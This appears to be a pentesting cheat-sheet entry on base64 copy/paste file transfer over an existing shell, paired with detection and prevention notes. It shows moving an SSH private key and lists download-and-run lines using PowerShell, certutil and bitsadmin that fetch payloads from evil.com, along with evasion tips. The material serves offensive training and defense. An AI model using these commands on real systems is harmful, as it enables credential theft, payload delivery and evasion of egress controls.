examples.label: Encode a key on Linux to copy the text
Rebuild it on Windows from the pasted string

notes: Always compare md5/Get-FileHash on both ends - terminals can silently drop characters on large blobs.

recommended.note: Raw nc pipe for bigger files.

name: Base64 - Copy/Paste Transfer
description: When you only have a shell (no network transfer), base64-encode a file, copy the text across, and decode on the other side. Verify with a hash so nothing was truncated.

variations.label: Linux -> Windows
variations.command:
# linux: cat id_rsa | base64 -w 0; echo ; md5sum id_rsa
# windows: [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64>"))
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

variations.label: Windows -> Linux
variations.command:
# windows: [Convert]::ToBase64String((Get-Content -Path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
Get-FileHash "C:\...\hosts" -Algorithm MD5
# linux: echo <base64> | base64 -d > hosts ; md5sum hosts

defense.why_it_works: When no network file transfer is possible, a file is base64-encoded, the string pasted over an existing shell, and decoded on the target (base64 -d / [Convert]::FromBase64String) - moving the file with zero separate network connection.
defense.prerequisites: An existing interactive shell on the target and the base64 utility (native on Linux; PowerShell on Windows).
defense.impact: A file reconstructed on the target without any download tool or new network flow - bypasses egress controls entirely.
defense.detection: No network transfer to catch; detection shifts to the shell/command line - a very long base64 string echoed and piped to base64 -d, or [Convert]::FromBase64String in PowerShell (4104), plus the new file on disk.
defense.artifacts: A large base64 blob in shell history / 4104 logs; the decoded file on disk; no network artifact.
defense.prevention: Command-line and script-block logging to catch large base64 decode operations; file-integrity monitoring for new executables; EDR on the reconstructed file's execution.
defense.evasion: This IS an evasion of network controls; splitting the blob and integrity-checking with md5sum avoids corruption, and decoding to a non-flagged path reduces AV attention.
defense.misconfiguration: Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.
defense.vulnerable_config:
# Living-off-the-land file download methods (all built into Windows/Linux):
# PowerShell (often bypasses older AV):
(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\Temp\shell.exe')

# certutil (trusted Microsoft binary, often not blocked):
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe

# bitsadmin (background transfer service):
bitsadmin /transfer myJob http://evil.com/shell.exe C:\Temp\shell.exe

# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.
defense.secure_config:
# Application allowlisting (most effective):
# Windows Defender Application Control (WDAC) or AppLocker
# Only signed, approved executables run
# Blocks dropping and running arbitrary payloads even via LOLBins

# PowerShell Constrained Language Mode + AMSI:
# GPO: PowerShell Execution Policy = AllSigned
# Blocks unsigned scripts; AMSI scans all scripts before execution

# Egress filtering — block outbound to unknown IPs:
# Web proxy with allowlist for legitimate update sources
# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)
# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'

# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process
# Defender ATP: 'Suspicious process using Certutil to download content'
